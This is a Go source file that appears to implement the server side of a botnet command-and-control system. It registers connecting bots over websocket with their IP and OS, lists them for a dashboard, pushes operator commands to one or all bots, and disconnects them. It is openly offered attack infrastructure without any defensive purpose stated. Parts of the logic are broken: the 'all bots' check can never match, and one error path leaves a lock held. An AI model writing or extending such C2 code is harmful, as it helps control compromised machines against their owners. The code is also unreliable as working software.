package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

func (c *c2) connectBot(w http.ResponseWriter, r *http.Request) {
	b := Bot{}

	var con *websocket.Conn
	var err error
	if con, err = websocket.Accept(w, r, nil); err != nil {
		log.Println(err)
		return
	}

	ctx := context.Background()
	if err := wsjson.Read(ctx, con, &b); err != nil {
		log.Println("Error reading the initial data of the bot : ", err)
		return
	}
	b.mu.Lock()
	b.con = con
	b.LastSeen = time.Now()
	b.Active = true
	c.registerBot(b.ID, &b)
	b.mu.Unlock()

	fmt.Print(b.ID, b.IP, b.OS, b.LastSeen)

	go c.listentoBot(&b)

}

func (c *c2) listentoBot(bot *Bot) {
	defer func() {
		c.DisconnectBot(bot.ID)
		log.Println("Deleted the Bot: ", bot.ID, "From the global bot list")

	}()

	var msg BotMessage
	for {
		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Minute)
		err := wsjson.Read(ctx, bot.con, &msg)
		cancel()

		if err != nil {
			log.Println("Bot Disconnected/Timeout : ", err)
			return
		}

		bot.updateLastseen()

	}
}

func (c *c2) SendCommand(w http.ResponseWriter, r *http.Request) {
	cmd := Command{}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		log.Println(err)
		return
	}
	json.Unmarshal(body, &cmd)
	// fmt.Println(cmd)

	if strconv.Itoa(cmd.BotID) == "*" {
		for _, v := range c.bots {
			if err = wsjson.Write(context.Background(), v.con, cmd.CmdType); err != nil {
				log.Println(err)
				continue
			}
			fmt.Println("Command send to bot : ", v.ID)
		}
	} else {
		bot := c.getBot(cmd.BotID)
		if err = wsjson.Write(context.Background(), bot.con, cmd.CmdType); err != nil {
			log.Println(err)
			return
		}
		fmt.Println("Command send to bot : ", bot.ID)
	}

} //send  execute command  message by admin
func (c *c2) ListBots(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	c.mu.RLock()
	defer c.mu.RUnlock()
	err := json.NewEncoder(w).Encode(c.bots)
	if err != nil {
		log.Println("Error sending list of bots : ", err)
		return
	}
	log.Println("List of bots send to dashboard.")
}

func (c *c2) DisconnectBot(botID int) bool {
	exist := true
	bot := c.getBot(botID)

	if bot == nil {
		exist = false
		log.Println("Bot with id: ", botID, "Dosent Exist")
		return exist
	}

	bot.mu.Lock()
	if err := bot.con.Close(websocket.StatusNormalClosure, "Bot Disconnected"); err != nil {
		log.Println("Error closing connection : ", err)
		exist = false
		return exist
	}
	bot.mu.Unlock()
	c.mu.Lock()
	delete(c.bots, botID)
	c.mu.Unlock()

	return exist
}
